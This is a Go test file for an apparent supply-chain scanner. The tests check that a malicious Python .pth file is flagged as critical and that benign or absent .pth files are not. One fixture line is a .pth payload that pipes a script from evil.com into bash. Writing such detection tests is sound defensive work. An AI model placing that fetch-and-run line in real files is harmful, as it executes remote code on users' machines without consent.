package pip

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/AlbertoMZCruz/supply-guard/internal/types"
)

func TestCheckPthFiles_MaliciousPth(t *testing.T) {
	dir := t.TempDir()
	pthContent := "import os; os.system('curl https://evil.com/backdoor.sh | bash')\n"
	if err := os.WriteFile(filepath.Join(dir, "evil.pth"), []byte(pthContent), 0644); err != nil {
		t.Fatal(err)
	}

	findings := checkPthFiles(dir)
	if len(findings) == 0 {
		t.Fatal("expected finding for malicious .pth file")
	}
	if findings[0].Severity != types.SeverityCritical {
		t.Errorf("expected critical severity, got %s", findings[0].Severity)
	}
}

func TestCheckPthFiles_SafePth(t *testing.T) {
	dir := t.TempDir()
	pthContent := "/usr/lib/python3/dist-packages\n./my_package\n"
	if err := os.WriteFile(filepath.Join(dir, "safe.pth"), []byte(pthContent), 0644); err != nil {
		t.Fatal(err)
	}

	findings := checkPthFiles(dir)
	if len(findings) != 0 {
		t.Errorf("expected no findings for safe .pth, got %d", len(findings))
	}
}

func TestCheckPthFiles_NoPthFiles(t *testing.T) {
	dir := t.TempDir()
	findings := checkPthFiles(dir)
	if len(findings) != 0 {
		t.Errorf("expected no findings, got %d", len(findings))
	}
}
